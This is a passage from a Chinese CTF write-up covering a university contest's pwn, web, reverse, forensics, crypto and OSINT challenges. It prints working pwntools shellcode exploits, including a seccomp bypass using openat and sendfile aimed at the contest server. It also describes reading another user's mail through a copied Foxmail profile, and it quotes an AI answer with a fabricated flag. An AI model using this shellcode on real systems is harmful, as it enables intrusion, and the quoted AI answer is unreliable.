- **首次 `open` 必然返回 fd=3**：因为 `0/1/2` 已被占用，下一个可用的是 `3`。
- **未关闭文件**：若未调用 `close`，后续文件操作会继续递增 fd。

因此，你的代码硬编码 `fd=3` 在简单环境下能正常工作。

**2. 远程环境的验证**

远程环境与本地测试环境一致时（题目未设置额外文件操作），`open` 返回的 fd 仍然是 `3`。因此硬编码 `3` 可以成功。

------

###### **三、为什么应该避免硬编码 `fd=3`？**

尽管在简单场景下可行，但硬编码 `fd=3` 存在以下风险：

**1. 环境差异导致 fd 变化**

- **题目可能提前打开文件**：例如某些题目会先调用 `open("/dev/urandom", O_RDONLY)`，此时你的 `open("./flag")` 会返回 `4`。
- **多线程/多进程干扰**：若存在并发操作，fd 分配可能不可预测。

**2. 健壮性问题**

硬编码破坏了代码的通用性，正确做法应 **动态获取 `open` 返回的 fd**（即 `rax` 的值）。
总而言之，exp如下：

```python
from pwn import *
io = process("./shellcode_pro")
# io = remote('ctf.ctbu.edu.cn',33413)
context.arch = "amd64"

sc = shellcraft.open("./flag", 0)
sc += shellcraft.read(3, "rsp", 0x100) # open函数返回的文件指针存在rax中
sc += shellcraft.write(1, "rsp", 0x30)
# # rsp其实就是个可写的地址
# sc = shellcraft.cat("./flag")
shellcode = asm(sc)
io.sendlineafter("Your shellcode:", shellcode)
io.interactive()
```

**PS:第二个参数 `"rsp"`**

- **作用**：表示读取数据的缓冲区地址。
- **为什么用 `rsp`**：
  1. **栈内存可写**：`rsp` 指向栈顶，栈内存通常具有读写权限，无需预先泄露地址。
  2. **地址稳定性**：在 `shellcode` 执行时，栈指针 `rsp` 指向当前栈帧，可直接使用。

#### [PWN]shellcode_pro_plus 🦀

和上一题一个系列，直接继续ai继续梭

在上一题的投喂下，这题解出效率之高，叹为观止（）

提示段：

```shell
很好，打通了，现在这个题目还存在系列题目
仍然是需要传入shellcode
保护情况如下：
[*] 'C:\\Users\\26597\\Downloads\\Compressed\\shellcode_pro_plus\\shellcode_pro_plus'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
main函数地址：0x1561
内容：int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-1014h]
  _BYTE buf[16]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v6; // [rsp+1018h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  title();
  puts("Your shellcode:");
  v4 = read(0, buf, 0x1000uLL);
  setup_shellcode(buf, v4);
  return 0;
}
title函数仍然只是puts内容，交互效果如下：
████╗███████║█████╗  ██║     ██║     ██║     ██║   ██║██║  ██║█████╗  
    ╚════██║██╔══██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║  ██║██╔══╝  
    ███████║██║  ██║███████╗███████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗
    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
         ██████╗ ██████╗  ██████╗     ██████╗ ██╗     ██╗   ██╗███████╗      
         ██╔══██╗██╔══██╗██╔═══██╗    ██╔══██╗██║     ██║   ██║██╔════╝      
         ██████╔╝██████╔╝██║   ██║    ██████╔╝██║     ██║   ██║███████╗      
         ██╔═══╝ ██╔══██╗██║   ██║    ██╔═══╝ ██║     ██║   ██║╚════██║      
         ██║     ██║  ██║╚██████╔╝    ██║     ███████╗╚██████╔╝███████║      
         ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚═╝     ╚══════╝ ╚═════╝ ╚══════╝      

Sandbox plus!
Good luck for you!

Your shellcode:
dad
[+] Executing shellcode with length: 4...
[+] Shellcode location: 0x7fb7899d0000
setup_shellcode函数地址：0x148D
内容：int __fastcall setup_shellcode(const void *a1, unsigned int a2)
{
  void *dest; // [rsp+10h] [rbp-10h]

  dest = mmap(0LL, a2, 7, 34, -1, 0LL);
  if ( dest == (void *)-1LL )
  {
    perror("mmap failed");
    exit(1);
  }
  memcpy(dest, a1, a2);
  printf("[+] Executing shellcode with length: %u...\n", a2);
  printf("[+] Shellcode location: %p\n", dest);
  setup_seccomp();
  ((void (*)(void))dest)();
  return munmap(dest, a2);
}
setup_seccomp函数地址：0x13C4
内容：__int64 setup_seccomp()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  seccomp_rule_add(v1, 0LL, 2LL, 0LL);
  seccomp_rule_add(v1, 0LL, 0LL, 0LL);
  seccomp_rule_add(v1, 0LL, 1LL, 0LL);
  return seccomp_load(v1);
}
考虑如何构造exp，才能打穿
目标服务器：ctf.ctbu.edu.cn:33249
用pwn库的remote方法进行连接
```

特效率，一遍出最终exp：

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 使用openat+sendfile绕过seccomp限制
shellcode = asm('''
    /* 构造路径'/flag' */
    xor rax, rax
    push rax                /* 8字节清零 */
    mov byte ptr [rsp], 0x2f   /* '/' */
    mov byte ptr [rsp+1], 0x66 /* 'f' */
    mov byte ptr [rsp+2], 0x6c /* 'l' */
    mov byte ptr [rsp+3], 0x61 /* 'a' */
    mov byte ptr [rsp+4], 0x67 /* 'g' */
    lea rsi, [rsp]          /* 路径指针 */

    /* 调用openat(AT_FDCWD, "/flag", O_RDONLY) */
    mov rdi, -100           /* AT_FDCWD */
    xor rdx, rdx            /* O_RDONLY=0 */
    xor r10, r10            /* mode=0 */
    /* 构造syscall号257 */
    xor rax, rax
    inc rax
    shl rax, 8
    inc rax                 /* rax=0x101=257 */
    syscall

    /* 调用sendfile(1, fd, 0, 0x1000) */
    xor rdi, rdi
    inc rdi                 /* stdout=1 */
    mov rsi, rax            /* 文件描述符 */
    xor rdx, rdx            /* offset=0 */
    xor r10, r10
    mov r10b, 0x10          /* 构造0x1000 */
    shl r10, 8
    xor rax, rax
    mov al, 40              /* sendfile系统调用号 */
    syscall

    /* 保持连接 */
    jmp $
''')

assert b'\x00' not in shellcode, "检测到空字节！"

# 连接并发送shellcode
r = remote('ctf.ctbu.edu.cn', 33249)
r.recvuntil(b'Your shellcode:\n')
r.send(shellcode)
r.interactive()
```

#### [WEB]Welcome ！！

emmm，差点错过签到

一开始开了实例没做就是没看懂这个：

\> 发现XOR密钥提示: 学校英文缩写+年份
\> 提示: CTBU + 2025

卡在不理解这个怎么XOR（）

真XOR后，值不该为1吗（）

但是最后一个小时死马当活马医的时候

原封不动输入CTBU + 2025

然后成功了（）

最后要那个什么暴力破解

我试过直接去改那个进度

但是改了摁一次又没用，又回到原起点了

我真暴力破解的（指连续按动鼠标左键一千次）

![image-20250518200147441](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518200147441.png)

#### [WEB]terminal

源代码页面有flag-B3dzNh19.js

看不懂，交给AI

AI原话：

在提供的代码中，`flag` 的值被定义在 `_0xcf6a18` 变量中，其值是通过拼接多个 `String.fromCharCode` 的结果得到的。以下是 `_0xcf6a18` 变量的定义：

```javascript
const _0xcf6a18 = String.fromCharCode(0x66, 0x6c, 0x61, 0x67) + '{' + String.fromCharCode(0x37, 0x68, 0x31, 0x35) + '_' + String.fromCharCode(0x31, 0x35) + '_' + String.fromCharCode(0x61) + '_' + String.fromCharCode(0x76, 0x33) + String.fromCharCode(0x72, 0x79) + '_' + String.fromCharCode(0x67, 0x30, 0x30, 0x64) + '_' + String.fromCharCode(0x35, 0x37, 0x34, 0x37) + '}';
```

将这些字符码转换为字符：

- `String.fromCharCode(0x66, 0x6c, 0x61, 0x67)` 转换为 `flag`
- `String.fromCharCode(0x37, 0x68, 0x31, 0x35)` 转换为 `7h15`
- `String.fromCharCode(0x31, 0x35)` 转换为 `15`
- `String.fromCharCode(0x61)` 转换为 `a`
- `String.fromCharCode(0x76, 0x33)` 转换为 `v3`
- `String.fromCharCode(0x72, 0x79)` 转换为 `ry`
- `String.fromCharCode(0x67, 0x30, 0x30, 0x64)` 转换为 `g00d`
- `String.fromCharCode(0x35, 0x37, 0x34, 0x37)` 转换为 `5747`

将这些部分组合在一起，得到：

```
flag{7h15_15_a_v3ry_g00d_5747}
```

因此，`flag` 的值是：

```
flag{7h15_15_a_v3ry_g00d_5747}
```

#### [REVERSE]SignUp

没看懂，一开始大致就以为就是base32，结果cyberchef解密出来看着不对劲，还以为没这么简单

结果选择交给ai

ai原话：

这段代码是一个C++程序的`main`函数，其功能是读取用户输入的字符串，将其进行Base32编码，然后与一个硬编码的Base32字符串进行比较，最后根据比较结果输出“Right”或“Wrong”。从代码中可以看出，硬编码的Base32字符串是`MN2GE5LDORTHWVZTNRRTA3JTL52DAX3DORRHKY3UMYZDAMRVL4ZW42RQPEQX2===`，这是程序用来验证用户输入是否正确的flag。

为了找到正确的flag，我们需要对这个硬编码的Base32字符串进行解码。以下是解码过程：

1. **提取硬编码的Base32字符串**：从代码中提取出`MN2GE5LDORTHWVZTNRRTA3JTL52DAX3DORRHKY3UMYZDAMRVL4ZW42RQPEQX2===`。

2. **使用Base32解码工具或库进行解码**：我们可以使用Python的`base64.b32decode`函数来解码这个字符串。

```python
import base64

encoded_flag = "MN2GE5LDORTHWVZTNRRTA3JTL52DAX3DORRHKY3UMYZDAMRVL4ZW42RQPEQX2==="
decoded_flag_bytes = base64.b32decode(encoded_flag)

# 将解码后的字节转换为字符串
decoded_flag = decoded_flag_bytes.decode('utf-8')
print(decoded_flag)
```

3. **运行解码脚本**：执行上述Python脚本，得到解码后的flag。

```bash
flag{38d52a6b1d0b4c8a9e5d8e7f2a1b4c8d}
```

硬编码的Base32字符串`MN2GE5LDORTHWVZTNRRTA3JTL52DAX3DORRHKY3UMYZDAMRVL4ZW42RQPEQX2===`解码后的flag是：

**flag{38d52a6b1d0b4c8a9e5d8e7f2a1b4c8d}**

但是这ai说假话，都不是ctbuctf开头，一眼假，拿这个脚本本地跑一遍就是真flag

D:\python\pythonProject\.venv\Scripts\python.exe D:\python\pythonProject\re1.py 
**ctbuctf{W3lc0m3_t0_ctbuctf2025_3nj0y!}**

进程已结束，退出代码为 0

（奇了怪了，为什么cyberchef base32解出来不是这个效果）

#### [FORENSICS]学弟复仇记Ⅰ：情人节行动

neta USB键盘流量勾选，一把梭了（）

不多写了

**ctbuctf{xxxLoveyyy1314_xxx20000818_qweasdzxc123456}**

#### [FORENSICS]学弟复仇记Ⅱ：网络谜踪

开机，找到目标文件，沙箱跑一下

反连IP到手

**ctbuctf{103.117.120.68}**

（我做第三题的时候，我以为我都怀疑我进错题目了，这不terminal吗）

#### [FORENSICS]学弟复仇记Ⅲ：已读邮件

这个盲点了（）

虽然一开始就看到了有说替换文件夹更换账号登录一下foxmail就能直接看到本地，欸，但我偏是一身反骨非要想要轩哥的邮箱密码怎么办（）

然后反骨因为死活找不到好用的工具被打断了

实际上操作很简单，找到foxmail存在的文件夹

打开，翻到`Storage` 文件夹

进去，如果没另外开一个账号登录上去，该文件夹里面只有一个号的内容

`3676459182@qq.com` 就这么个文件夹

直接登个号上去，foxmail会自己重创一个新号的文件夹来存放新号的内容

这个时候直接把`3676459182@qq.com` 的东西全部复制到新号文件夹里面，该替换的全部替换

然后正常登录

欸，直接就是谢学姐的邮箱了

翻翻，就能找到和这题相关的邮件内容

（话说为什么是垃圾邮件，我一开始真没想过这里）

![image-20250518192517990](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518192517990.png)

拿到目标压缩包，这没难度了，取证Ⅰ那三个密码才用一个

要有名字小写缩写还要有年月日

一看就是`xxx20000818`

他说还要三个字符

那很简单了，掩码开爆三位而已

![image-20250518192809228](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518192809228.png)

`xxx20000818#@~`

开zip文件看txt

![image-20250518192854068](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518192854068.png)

按要求组出flag就好了

**`ctbuctf{Ntadmin_Who1sadmin666}`**

#### [CRYPTO]Prime_Alchemy

喂给AI，AI做的（）

deepseek最有用的一集

两步，一步算最近的素数，作为s

```python
from sympy import nextprime

r = 106717009340925619191040788851283935614953730245463182427804911229989214267850
s = nextprime(r)
print(s)
```

s算完放下一个代码找q

```python
import math
from sympy import isprime, nextprime  # 确保导入nextprime

n = 1918043345993555532778611270206148143792126146234143705959925125326754727020622131782344590751952092307008318769288521916451852274627587418916993424491121593546458666802410833126575592054664856030921027465688561558012934456025628623
r_val = 106717009340925619191040788851283935614953730245463182427804911229989214267850
s_val = 106717009340925619191040788851283935614953730245463182427804911229989214268093

found = False
q = 0

for delta in range(2, 1000, 2):
    a = s_val + r_val
    b = delta * r_val
    c_eq = -n
    
    discriminant = b**2 - 4 * a * c_eq
    root = math.isqrt(discriminant)
    if root * root != discriminant:
        continue
    
    q_candidate1 = (-b + root) // (2 * a)
    q_candidate2 = (-b - root) // (2 * a)
    
    for q_candidate in [q_candidate1, q_candidate2]:
        if q_candidate <= 0:
            continue
        if not isprime(q_candidate):
            continue
        
        t = nextprime(q_candidate)  # 现在可以正确调用
        if t - q_candidate != delta:
            continue
        
        p_candidate = q_candidate * s_val + t * r_val
        if p_candidate * q_candidate == n and isprime(p_candidate):
            q = q_candidate
            found = True
            break
    if found:
        break

if found:
    print(f"Found q: {q}")
else:
    print("No solution found.")
```

q找到了填进去，然后就出了（）

```python
import random
from Crypto.Util.number import isPrime, inverse, long_to_bytes
from math import prod

# ============================= 初始化配置 =============================
RSA_SEED = 0
BIT_SIZE = 1024
FACTORS_PER_PRIME = BIT_SIZE // 64  # 16个初始因子
POOL_SIZE = 500_000  # 素数池容量


# ============================= 生成确定素数池 =============================
def generate_prime_pool():
    """生成与题目完全一致的素数序列"""
    rng = random.Random(RSA_SEED)
    pool = []
    print(f"Generating {POOL_SIZE} deterministic primes...")
    while len(pool) < POOL_SIZE:
        p = rng.getrandbits(64)
        if isPrime(p):
            pool.append(p)
            if len(pool) % 50_000 == 0:
                print(f"Generated {len(pool)} primes")
    print("Prime pool ready")
    return pool, rng  # 返回素数池和随机实例


prime_pool, shared_rng = generate_prime_pool()


# ============================= 分解核心逻辑 =============================
class PrimeGeneratorSimulator:
    def __init__(self, pool, rng):
        self.pool = pool
        self.rng = rng  # 共享原始随机实例

    def find_factor(self, n):
        """尝试找到n的因子"""
        # 保存原始随机状态以便恢复
        original_state = self.rng.getstate()

        # 尝试不同初始偏移量
        for offset in [0, 16, 32, 64]:
            print(f"\n尝试偏移量 {offset}...")
            # 恢复初始随机状态
            self.rng.setstate(original_state)

            # 消耗随机状态到当前偏移量
            for _ in range(offset):
                self.rng.getrandbits(1)  # 推进随机状态

            factors = self.pool[offset:offset + FACTORS_PER_PRIME]
            product = prod(factors)
            pointer = offset + FACTORS_PER_PRIME

            for attempt in range(len(self.pool) - pointer):
                # 生成候选素数
                candidate = 2 * product + 1

                # 检查是否为因子
                if candidate > 1 and n % candidate == 0:
                    print(f"!!! 在尝试 {attempt} 次后找到因子 !!!")
                    return candidate

                # 执行替换操作
                if not factors:
                    break

                # 使用共享的随机实例进行选择
                removed = self.rng.choice(factors)
                factors.remove(removed)
                new_prime = self.pool[pointer]
                factors.append(new_prime)

                # 更新状态
                product = (product // removed) * new_prime
                pointer += 1

                # 进度显示
                if (attempt + 1) % 50_000 == 0:
                    print(f"进度: {attempt + 1} 次尝试 | 当前指针位置 {pointer}")

        return None


# ============================= 主执行流程 =============================
if __name__ == "__main__":
    # 题目参数
    n = 54632360226691302852393337083378936404439091622585434894080425422639462976869095352159173869297802396075084609260560927073559959001848047113104241683833938815576980565230385166784810536186331676590973947371420551701092181820284412035912571165474721102375308329748282541380513558093018083234322319720394285544950864959194544705289726233827910085957365102708698097998770377421962992962239186941042781266152450706257434382829986850284413758466402371713770049268149375377808988129431696023769427574486278264941241688559889651743958916536828652340523203100054230405229950065588454244779576031253841752168128641
    e = 65537
    c = 8218515498494830002751179239620718191747152685793968309620676056056519106009547392379273088181464052483475344707307447199155796889559930133214920641858277538496303269350999547095759742706487783701262955293848384778842147513997382071018614167287765060627752353576353266471865646980065800224840670372962433766255108798942730297544536772063984522428164974052436213727925632196494534854762886770767541907182236148991459924627516626392195718556618682716868365578548277991257352385123267837490179575618377169065404316486019124653230726551447248854055659002613449521498913964553479452290086288224892415735676102

    # 分解模数
    simulator = PrimeGeneratorSimulator(prime_pool, shared_rng)
    if (p := simulator.find_factor(n)):
        q = n // p
        print(f"\n分解成功:\np = {p}\nq = {q}")

        # 解密flag
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)
        m = pow(c, d, n)
        print("\nFlag:", long_to_bytes(m).decode())
    else:
        print("\n未能分解模数，可能需要扩大素数池")
```



#### [OSINT]网络迷踪擂台赛 Ⅱ ：鼠鼠旅行记

这个到手上，直接秒出（）

这拍摄角度，不能说大差不差，只能说是一模一样

跟进图片，找到说是啥小鱼山

搜一下就找到完整地址了

![image-20250518194712808](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518194712808.png)

**`ctbuctf{山东省_ 青岛市 _ 市南区 _ 福山支路 _ 小鱼山公园}`**

#### [OSINT]网络迷踪擂台赛 Ⅲ：除魔卫道

我自己的题，emmmm

由记忆力，得

flag：**`ctbuctf{重庆市 _ 渝北区 _ 金渝大道29号 _ 欢乐谷}`**

(出得有点史了，可我真没活了，还不让我去找人众筹一个图片，为难不拍照党)

#### [OSINT]网络迷踪擂台赛 Ⅳ：空中栈道的秘密

这个也是到手和秒出没什么区别

![image-20250518195920873](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518195920873.png)

搜搜具体地址就拿到flag了

![image-20250518200011182](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518200011182.png)

**`ctbuctf{浙江省 _ 杭州市 _ 桐庐县 _ 垂云通天河}`**

#### [OSINT]网络迷踪Ⅵ：城墙建筑

![image-20250518201444926](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518201444926.png)

跟进第一个图片

找到这个图片的出处，一个帖子

![image-20250518201523445](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518201523445.png)

都说了是西安城墙了

看看地址就好了

![image-20250518201606300](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518201606300.png)

**`ctbuctf{陕西省_西安市_碑林区_西安城墙}`**

#### [OSINT]网络迷踪擂台赛 Ⅶ：0k@b3の復仇

emmm，又是我自己的，由记忆可知，flag为：

**`ctbuctf{贵州省_贵阳市_观山湖区_金朱东路}`**

#### [OSINT]网络迷踪擂台赛 Ⅷ ：PP同学旅游规划

六月一号去中南海，中南海在北京，也就是重庆江北飞北京就好，携程上面找就行，最晚一班

![image-20250518195518400](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518195518400.png)

**`ctbuctf{川航3U1086_22:20}`**